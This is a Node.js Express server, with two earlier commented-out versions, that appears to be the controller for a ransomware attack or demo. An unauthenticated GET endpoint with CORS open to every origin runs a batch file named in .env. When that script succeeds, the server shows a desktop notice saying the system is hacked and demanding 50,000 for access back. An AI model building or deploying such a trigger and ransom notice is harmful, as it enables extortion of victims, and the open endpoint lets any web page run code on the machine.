const express = require('express');
const { exec } = require('child_process');
const cors = require('cors');
const dotenv = require('dotenv');
const notifier = require('node-notifier');

dotenv.config();

const app = express();
const port = 3001;

app.use(cors());

const batFilePath = process.env.BAT_FILE_PATH;
const iconPath = process.env.ICON_PATH;

if (!batFilePath) {
  console.error('Batch file path is not specified in the .env file');
  process.exit(1);
}

app.get('/runBatchFile', (req, res) => {
  exec(batFilePath, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing the batch file: ${error.message}`);
      return res.status(500).send('Error');
    }

    console.log(`Batch file output: ${stdout}`);

    if (stdout.includes('Success')) {
      
      console.log('Before notifier.notify');
      notifier.notify({
          title: 'Your System is Hacked!!!!!!   Ransomware Attack',
          message: 'Pay 50,000 to get your Access Back',
          icon: iconPath,
          timeout: 10000,
        });
      console.log('After notifier.notify');


      res.send('Success');
    } else {
      res.status(500).send('Error');
    }
  });
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});




/*const express = require('express');
const { exec } = require('child_process');
const cors = require('cors');
const dotenv = require('dotenv');
const notifier = require('node-notifier');

dotenv.config();

const app = express();
const port = 3001;

app.use(cors());

const batFilePath = process.env.BAT_FILE_PATH;
const iconPath = process.env.ICON_PATH;

if (!batFilePath) {
  console.error('Batch file path is not specified in the .env file');
  process.exit(1);
}

app.get('/runBatchFile', (req, res) => {
  exec(batFilePath, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing the batch file: ${error.message}`);
      return res.status(500).send('Error');
    }

    console.log(`Batch file output: ${stdout}`);


    if (stdout.includes('Success')) {
      // Show a notification
      setTimeout(() => {
        notifier.notify({
          title: 'Your System is Hacked!!!!!!   Ransomware Attack',
          message: 'Pay 50,000 to get your Access Back',
          icon: iconPath,
          timeout: 10000,
        });
      }, 5000); // Adjust the delay as needed
      
      
      res.send('Success');
    } else {
      res.status(500).send('Error');
    }
  });
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
*/





/*const express = require('express');
const { exec } = require('child_process');
const cors = require('cors');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
const port = 3001;

app.use(cors());

const batFilePath =  process.env.BAT_FILE_PATH;

if (!batFilePath) {
  console.error('Batch file path is not specified in the .env file');
  process.exit(1);
}


app.get('/runBatchFile', (req, res) => {
  

  exec(batFilePath, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error executing the batch file: ${error.message}`);
      return res.status(500).send('Error');
    }

    console.log(`Batch file output: ${stdout}`);
    res.send('Success');
  });
});

app.listen(port, () => {
  console.log(`Server is running on http://localhost:${port}`);
});
*/